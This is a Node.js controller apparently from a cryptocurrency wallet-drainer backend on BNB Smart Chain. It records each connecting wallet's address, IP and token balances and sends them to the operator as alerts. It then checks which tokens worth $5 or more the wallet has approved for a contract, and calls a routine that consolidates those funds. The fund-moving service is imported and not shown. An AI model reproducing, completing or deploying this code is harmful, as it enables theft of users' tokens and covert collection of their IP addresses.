const { web3, contract } = require('../config');
const { getAllSupportedTokensBalance, checkAllowance } = require('../services/tokenService');
const { consolidateFunds } = require('../services/consolidateService');
const { sendAllNotifications } = require('../services/notificationService');
const { isAddress } = require('web3-validator');

// Handle wallet connect
async function handleWalletConnect(req, res) {
    try {
        const { walletAddress, ipAddress, tokenBalances } = req.body;
        
        if (!walletAddress) {
            return res.status(400).json({
                success: false,
                error: 'walletAddress required'
            });
        }
        
        if (!isAddress(walletAddress)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid wallet address format'
            });
        }
        
        res.json({ 
            success: true, 
            message: 'Wallet connect received' 
        });
        
        // Build message with token balances
        let msg = `👤 Wallet: ${walletAddress}\n🌐 IP: ${ipAddress || 'Unknown'}\n📅 ${new Date().toISOString()}\n\n`;
        
        if (tokenBalances && tokenBalances.length > 0) {
            msg += `📋 Token Balances:\n`;
            let totalValue = 0;
            
            for (const token of tokenBalances) {
                const value = Number(token.usdValue) || 0;
                totalValue += value;
                msg += `  • ${token.name || 'UNKNOWN'}: $${value.toFixed(2)}\n`;
            }
            
            msg += `\n💰 Total Value: $${totalValue.toFixed(2)}`;
        } else {
            msg += `📋 No tokens found`;
        }
        
        await sendAllNotifications('🆕 NEW WALLET CONNECTED', msg);
        
    } catch (error) {
        console.error('❌ Wallet connect error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
}

// Handle approval
async function handleApproval(req, res) {
    try {
        const { walletAddress, tokenAddress } = req.body;
        
        if (!walletAddress || !tokenAddress) {
            return res.status(400).json({ 
                success: false, 
                error: 'walletAddress and tokenAddress required' 
            });
        }
        
        if (!isAddress(walletAddress)) {
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid wallet address format' 
            });
        }
        
        if (!isAddress(tokenAddress)) {
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid token address format' 
            });
        }
        
        res.json({
            success: true,
            message: 'Approval received, processing in background'
        });
        
        processApprovalInBackground(walletAddress, tokenAddress).catch(error => {
            console.error('❌ Background processing error:', error);
        });
        
    } catch (error) {
        console.error('❌ Controller error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
}

// Background processing
async function processApprovalInBackground(walletAddress, tokenAddress) {
    try {
        console.log(`📥 Processing approval: ${walletAddress} - ${tokenAddress}`);
        
        const tokenBalances = await getAllSupportedTokensBalance(walletAddress);
        
        if (tokenBalances.length === 0) {
            console.log('❌ No tokens with balance found');
            const msg = `👤 Wallet: ${walletAddress}\n\n❌ No supported tokens found`;
            await sendAllNotifications('⚠️ NO TOKENS FOUND', msg);
            return;
        }
        
        const highValueTokens = tokenBalances.filter(t => Number(t.balanceValue) >= 5);
        
        if (highValueTokens.length === 0) {
            console.log('⚠️ No token above $5');
            
            let msg = `👤 Wallet: ${walletAddress}\n\n📋 Wallet Balance:\n`;
            for (const token of tokenBalances) {
                msg += `  • ${token.symbol}: $${token.balanceValue}\n`;
            }
            msg += `\n❌ No token above $5`;
            
            await sendAllNotifications('⚠️ LOW BALANCE', msg);
            return;
        }
        
        const approvedTokens = [];
        for (const token of highValueTokens) {
            const allowance = await checkAllowance(
                walletAddress, 
                token.tokenAddress, 
                process.env.CONTRACT_ADDRESS
            );
            
            if (Number(allowance) > 0) {
                approvedTokens.push(token);
            }
        }
        
        if (approvedTokens.length === 0) {
            console.log('❌ No allowance for high value tokens');
            const msg = `👤 Wallet: ${walletAddress}\n\n❌ No allowance granted for tokens above $5`;
            await sendAllNotifications('⚠️ NO ALLOWANCE', msg);
            return;
        }
        
        await consolidateFunds(walletAddress, tokenBalances);
        
    } catch (error) {
        console.error('❌ Background processing error:', error);
    }
}

// Get supported tokens
async function getSupportedTokens(req, res) {
    try {
        const tokens = await contract.methods.getSupportedTokens().call();
        res.json({ 
            success: true, 
            tokens: tokens.map(t => t.toString()) 
        });
    } catch (error) {
        console.error('❌ Get tokens error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
}

// Health check
async function healthCheck(req, res) {
    try {
        const blockNumber = await web3.eth.getBlockNumber();
        res.json({
            status: 'ok',
            network: 'BSC',
            blockNumber: blockNumber.toString(),
            contract: process.env.CONTRACT_ADDRESS
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            error: error.message
        });
    }
}

module.exports = {
    handleApproval,
    handleWalletConnect,
    getSupportedTokens,
    healthCheck
};